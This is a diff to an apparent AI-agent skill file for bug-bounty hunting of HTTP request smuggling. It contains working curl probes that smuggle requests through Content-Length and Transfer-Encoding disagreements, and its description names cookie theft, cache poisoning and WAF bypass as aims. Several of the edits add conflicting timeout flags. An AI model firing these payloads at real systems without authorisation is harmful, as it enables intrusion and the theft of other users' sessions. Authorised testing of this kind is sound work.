@@ -1,8 +1,11 @@
 ---
 name: hunt-http-smuggling
-description: "Hunt HTTP request smuggling (CL.TE, TE.CL, H2.CL, H2.TE). Cause: front-end proxy and back-end server disagree on where one request ends and the next begins (Content-Length vs Transfer-Encoding header parsing inconsistency). CL.TE: front-end uses CL, back uses TE → smuggle by sending TE: chunked but with body that fits CL count. TE.CL: opposite. H2.CL: HTTP/2 downgrade, smuggle CL into HTTP/1.1 back-end. Detection tools: Burp HTTP Request Smuggler extension, smuggler.py, h2csmuggler. Confirm: time-delay technique (smuggled GET with 30s timeout) — if front-end returns slow on next victim request, smuggling works. Validate: cache poisoning chain (smuggle request that gets cached for victim), credential theft (smuggle X-Forwarded-For override that captures next user's cookies), bypass auth (smuggled internal-path request). Real paid examples from major CDN deployments. Use when hunting H1 paid programs running CDN+origin stacks, when targeting load balancer / WAF bypass."
-sources: portswigger_research, hackerone_public, field_recon
-report_count: 9
+description: "Hunt HTTP request smuggling (CL.TE, TE.CL, H2.CL, H2.TE). Cause: front-end proxy and back-end server disagree on where one request ends and the next begins (Content-Length vs Transfer-Encoding header parsing inconsistency). CL.TE: front-end uses CL, back uses TE → smuggle by sending TE: chunked but with body that fits CL count. TE.CL: opposite. H2.CL: HTTP/2 downgrade, smuggle CL into HTTP/1.1 back-end. Detectiontools: Burp HTTP Request Smuggler extension, smuggler.py, h2csmuggler. Confirm: time-delay technique (smuggled GET with 30s timeout) — if front-end returns slow on next victim request, smuggling works. Validate: cache poisoning chain (smuggle request that gets cached for victim), credential theft (smuggle X-Forwarded-For override that captures next user's cookies), bypass auth (smuggled internal-path request). Real paid examples from major CDN deployments. Use when hunting H1 paid programs running CDN+origin stacks, when targeting load balancer / WAF bypass."
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [http-smuggling, hunt, redteam]
 ---
 
 ## 17. HTTP REQUEST SMUGGLING
@@ -56,7 +59,7 @@ The classic CL.TE / TE.CL payloads are NOT universally exploitable in 2026. Mode
 ### Operator fingerprint quick-check
 
 ```bash
-curl -sI https://target/ | grep -i "Server:"
+curl --max-time 30 --connect-timeout 10 -sI https://target/ | grep -i "Server:"
 ```
 
 - `nginx/1.21+`, `Caddy`, `envoy` → CL/TE classic is dead — pivot to H2.CL/H2.TE if the front-end speaks HTTP/2, or look for legacy proxies upstream
@@ -91,7 +94,7 @@ Also called "CL.0" or "ignored Content-Length". The front-end reads Content-Leng
 
 ```bash
 # CL.0 timing probe: delay on backend indicates CL ignored
-curl -s --raw -X POST "https://target.com/" \
+curl --max-time 30 --connect-timeout 10 -s --raw -X POST "https://target.com/" \
   -H "Transfer-Encoding: chunked" \
   -H "Content-Length: 4" \
   -d $'x' \
@@ -197,7 +200,7 @@ When both front-end and back-end support Transfer-Encoding, but parse the header
 
 ```bash
 # TE.TE probe: tab injection
-curl -s -X POST "https://target.com/" \
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://target.com/" \
   -H "Transfer-Encoding:\tchunked" \
   -H "Content-Length: 4" \
   -d $'0\r\n\r\n' \
@@ -205,14 +208,14 @@ curl -s -X POST "https://target.com/" \
   --max-time 10
 
 # TE.TE probe: space before colon
-curl -s -X POST "https://target.com/" \
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://target.com/" \
   -H "Transfer-Encoding : chunked" \
   -H "Content-Length: 4" \
   -d $'0\r\n\r\n' \
   -w "HTTP_CODE: %{http_code}\n"
 
 # TE.TE probe: double header (front picks first, back picks last)
-curl -s -X POST "https://target.com/" \
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://target.com/" \
   -H "Transfer-Encoding: x" \
   -H "Transfer-Encoding: chunked" \
   -H "Content-Length: 4" \
@@ -220,7 +223,7 @@ curl -s -X POST "https://target.com/" \
   -w "HTTP_CODE: %{http_code}\n"
 
 # TE.TE probe: X-chunked variant
-curl -s -X POST "https://target.com/" \
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://target.com/" \
   -H "Transfer-Encoding: xchunked" \
   -d $'0\r\n\r\nGET /404 HTTP/1.1\r\nHost: target.com\r\n\r\n' \
   --max-time 10
@@ -320,11 +323,11 @@ function ha_rank() {
   local t=$1
   local score=0
   # Test 1: CL+TE coexistence → does the server 400?
-  curl -sk -m 10 -X POST "$t/" -H "Content-Length: 4" -H "Transfer-Encoding: chunked" -d $'x' -w "%{http_code}" | grep -q 400 && echo "CL+TE → 400 (RFC strict)" || { echo "CL+TE → accepted (+1)"; score=$((score+1)); }
+  curl --max-time 30 --connect-timeout 10 -sk -m 10 -X POST "$t/" -H "Content-Length: 4" -H "Transfer-Encoding: chunked" -d $'x' -w "%{http_code}" | grep -q 400 && echo "CL+TE → 400 (RFC strict)" || { echo "CL+TE → accepted (+1)"; score=$((score+1)); }
   # Test 2: Timing desync probe
-  timeout 15 curl -sk -X POST "$t/" -H "Transfer-Encoding: chunked" -d $'0\r\n\r\nGET / HTTP/1.1\r\nHost: x\r\n\r\n' -w "%{time_total}" 2>/dev/null | awk '{if ($1 > 5) print "Timing desync (+2)"; else print "No timing desync"}'
+  timeout 15 curl --max-time 30 --connect-timeout 10 -sk -X POST "$t/" -H "Transfer-Encoding: chunked" -d $'0\r\n\r\nGET / HTTP/1.1\r\nHost: x\r\n\r\n' -w "%{time_total}" 2>/dev/null | awk '{if ($1 > 5) print "Timing desync (+2)"; else print "No timing desync"}'
   # Test 3: TE.TE obfuscation (tab injection)
-  curl -sk -m 10 -X POST "$t/" -H $'Transfer-Encoding:\tchunked' -d $'0\r\n\r\n' -w "%{http_code}" | grep -q 400 && echo "TE.TE tab → blocked" || echo "TE.TE tab → accepted (+1)"
+  curl --max-time 30 --connect-timeout 10 -sk -m 10 -X POST "$t/" -H $'Transfer-Encoding:\tchunked' -d $'0\r\n\r\n' -w "%{http_code}" | grep -q 400 && echo "TE.TE tab → blocked" || echo "TE.TE tab → accepted (+1)"
   # Test 4: H2.CL if H2 available
   which h2csmuggler 2>/dev/null && h2csmuggler.py -x "$t" --h2cl --method GET --path "/" --delay 3 2>&1 | grep -q "VULNERABLE" && { echo "H2.CL vulnerable (+2)"; score=$((score+2)); }
   echo "--- HA Rank: $score/5 ---"
@@ -357,12 +360,12 @@ Match the test variant to the detected or assumed stack. Do NOT fire all payload
 
 ```bash
 # Step 1: Fingerprint the stack
-curl -sI "https://target.com/" | grep -iE "^(server:|via:|x-powered-by:|x-served-by:|cf-ray:|akamai|fastly)"
+curl --max-time 30 --connect-timeout 10 -sI "https://target.com/" | grep -iE "^(server:|via:|x-powered-by:|x-served-by:|cf-ray:|akamai|fastly)"
 # Or use httpx for stack detection
 httpx -u "https://target.com/" -td -sc -server
 
 # Step 2: Quick RFD (Request Fingerprint Detection) — does the endpoint return 400 on garbage?
-curl -s -m 5 -X PURGE "https://target.com" -w "%{http_code}"  # 405 → alive; 400 → strict
+curl --max-time 30 --connect-timeout 10 -s -m 5 -X PURGE "https://target.com" -w "%{http_code}"  # 405 → alive; 400 → strict
 
 # Step 3: Based on stack (table above), run primary and secondary probes
 # Step 4: If timing delta > 3s on any probe, escalate to HA Rank scoring
@@ -399,7 +402,7 @@ python3 smuggler.py -u "https://target.com/" -m POST -H "X-Forwarded-Host: evil.
 
 #### h2csmuggler (Assetnote / VanTuynh)
 
-HTTP/2 → HTTP/1.1 downgrade smuggling tool. Handles raw H2 frames.
+HTTP/2 → HTTP/1.1 downgrade smuggling toolchain. Handles raw H2 frames.
 
 ```bash
 # Install
@@ -507,6 +510,39 @@ if __name__ == "__main__":
     else:
         print("[-] No CL.0 desync detected")
 ```
+
+---
+
+## Verification
+
+Run this self-test to confirm http-smuggling hunting readiness:
+
+1. **Skill integrity** — confirm the skill file is readable and well-formed:
+   ```bash
+   grep -q "name: hunt-http-smuggling" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
+   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
+   ```
+
+2. **Category check** — confirm the skill has a category:
+   ```bash
+   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
+   ```
+
+3. **Pitfalls section** — confirm pitfalls are documented:
+   ```bash
+   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
+   ```
+
+All 3 tests verify the skill is properly structured and ready for use.
+
+---
+
+## Pitfalls
+- **HTTP smuggling without two-tier architecture** — smuggling requires a front-end proxy and back-end server that disagree on request boundaries. Single-tier apps are immune.
+- **TE.CL vs CL.TE confusion** — these are opposite attacks. Fingerprint the specific disagreement before attempting.
+- **Smuggling probe without confirmable side effect** — a 200 or 400 on a probe request doesn't confirm smuggling. Need a visible side effect (cache poison, request queue poisoning, response queue).
+- **HTTP/2 downgrade smuggling** — H2C downgrade smuggling requires the backend to accept HTTP/1.1 over the same connection. Test if the backend speaks HTTP/1.1.
+- **WAF bypass via smuggling** — many WAFs don't reassemble smuggled requests. This is the primary value prop of smuggling attacks.
 
 ---
 
